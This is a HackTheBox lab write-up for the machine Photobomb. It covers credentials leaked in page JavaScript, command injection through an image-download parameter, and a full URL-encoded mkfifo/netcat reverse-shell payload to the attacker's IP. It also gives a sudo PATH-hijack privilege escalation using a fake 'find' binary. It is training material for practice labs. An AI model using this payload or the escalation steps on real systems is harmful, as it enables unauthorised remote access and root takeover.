---
layout: single
title: Photobomb hackthebox writeup
excerpt: "Easy linux machine in which we find exposed credentials, exploit a RCE and privilege escalate with PATH manipulation"
date: 2022-10-30
classes: wide
header:
  teaser: /assets/images/photobomb/photobomb_icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - writeup
tags:
  - hackthebox
  - PATH
  - fuzzing
  - RCE
---

![](/assets/images/photobomb/photobomb.png)

## User flag

As always let's start with port scanning, first a general scan and then a more in-depth scan of the open ports

```shell
nmap -n -Pn -sS -p- --min-rate 5000 -vv -oN allports 10.10.11.182

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

```shell
 nmap -p22,80 -sCV -oN targeted -vv 10.10.11.182
 PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
...
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Photobomb
|_http-favicon: Unknown favicon MD5: 622B9ED3F0195B2D1811DF6F278518C2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Since nothing interesting appears I tried connecting to the webpage, however, I got redirected to photobomb.htb so I added this line to my /etc/hosts as usual

```shell
10.10.11.182    photobomb.htb
```

On the page, we find a link to a subdirectory called printer but it asks us for credentials via HTTP auth. The page is really simple and after fuzzing for common files, I didn't find anything, so I looked at the page source code and found this in photobomb.js.

```javascript
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

By going to that URL we get HTTP auth credentials. Now we are presented with a webpage where you can download images with different sizes and extensions like .jpg or .png. As I always say in this kind of CTF challenge the first thing to do in this situation is to pentest the main functionality of the page thus I opened burpsuite and started looking at the request to download images. Here is an example

```
POST /printer HTTP/1.1

Host: photobomb.htb

Content-Length: 78

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://photobomb.htb

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Referer: http://photobomb.htb/printer

Accept-Encoding: gzip, deflate

Accept-Language: es,en-US;q=0.9,en;q=0.8

Connection: close



photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg&dimensions=3000x2000
```

As you can see it has three parameters photo,filetype, and dimensions. I tried getting an LFI with the photo parameters but It didn't work so my next target was the filetype parameter. I fuzzed the values of the parameter and got these results.


```shell
ffuf -w /home/dasor/wordlist/tmp.txt -u http://photobomb.htb/printer -v -X POST -d photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg&amp;filetype=FUZZ&amp;dimensions=3000x2000 -H Content-Type: application/x-www-form-urlencoded -H Authorization: Basic cEgwdDA6YjBNYiE=
```

| FUZZ | URL | Redirectlocation | Position | Status Code | Content Length | Content Words | Content Lines | Content Type | ResultFile |
  | :- | :-- | :--------------- | :---- | :------- | :---------- | :------------- | :------------ | :--------- | :----------- |
  | jpg | http://photobomb.htb/printer |  | 15 | 200 | 175902 | 553 | 415 | image/jpeg |  |
  | png | http://photobomb.htb/printer |  | 24 | 200 | 3495633 | 14863 | 13790 | image/png |  |
  | pngphp | http://photobomb.htb/printer |  | 631 | 200 | 175902 | 553 | 415 | text/html;charset=utf-8 |  |
  | jpghtml | http://photobomb.htb/printer |  | 682 | 200 | 175902 | 553 | 415 | text/html;charset=utf-8 |  |
  | jpgjpg | http://photobomb.htb/printer |  | 1174 | 200 | 175902 | 553 | 415 | text/html;charset=utf-8 |  |
  | jpgxml | http://photobomb.htb/printer |  | 2080 | 200 | 175902 | 553 | 415 | text/html;charset=utf-8 |  |
  | jpg[ | http://photobomb.htb/printer |  | 2081 | 200 | 175902 | 553 | 415 | text/html;charset=utf-8 |  |
  | jpg] | http://photobomb.htb/printer |  | 2082 | 200 | 175902 | 553 | 415 | text/html;charset=utf-8 |  |
  | png,bmp | http://photobomb.htb/printer |  | 2232 | 200 | 175902 | 553 | 415 | text/html;charset=utf-8 |  |

It seems that everything that you write behind either png or jpg is valid so I tested with `jpg;sleep%205` and it worked! (by the way %20 is just a space URL encoded). This is a significant opportunity to get a reverse shell so I started testing some out.

The only one that worked for me was the `rm mkfifo` from [revshells](https://www.revshells.com/), the request looks like this


```
POST /printer HTTP/1.1

Host: photobomb.htb

Content-Length: 201

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Authorization: Basic cEgwdDA6YjBNYiE=

Origin: http://photobomb.htb

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Referer: http://photobomb.htb/printer

Accept-Encoding: gzip, deflate

Accept-Language: es,en-US;q=0.9,en;q=0.8

Connection: close



photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.16%207777%20%3E%2Ftmp%2Ff%0A&dimensions=3000x2000
```

By the way, this is the command I used to encode the reverse shell

```shell
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.16 7777 >/tmp/f" | jq -sRr @uri
```

Once connected to the machine I did the tty treatment as usual

```shell
nc -lvp 7777
Connection from 10.10.11.182:42972
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
wizard@photobomb:~/photobomb$ ^Z
zsh: suspended  nc -lvp 7777
[dasor@archlinux ~]$ stty raw -echo;fg
[1]  + continued  nc -lvp 7777
                              script /dev/null -c bash
Script started, file is /dev/null
wizard@photobomb:~/photobomb$ export TERM=xterm
wizard@photobomb:~/photobomb$ stty rows 30 columns 132
```

At this point I was able to obtain the user flag

## Root Flag

This privilege escalation is easy, look into the sudo config and you will find something which seems to be a fatal flaw.

```shell
wizard@photobomb:~/photobomb$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

The user is allowed to execute '/opt/cleanup.sh' without any password. And by looking at it we can see another huge blunder.

```shell
wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

find is not using an absolute path so we can manipulate the $PATH variable to get root despite the secure_path option in sudo.

First, create a malicious find binary and give it execute permissions, for instance

```shell
wizard@photobomb:/dev/shm$ cat > find
su
^C
wizard@photobomb:/dev/shm$ chmod a+x find
```

Now change the $PATH variable by adding your path

```shell
wizard@photobomb:/dev/shm$ export PATH=$PWD:$PATH
```

And now execute the script as sudo but make sure to overwrite the $PATH like this so you bypass the secure_path option for sudo

```shell
wizard@photobomb:/dev/shm$ sudo PATH=$PATH /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb# whoami
root
```

and that's all! , thank you for reading.
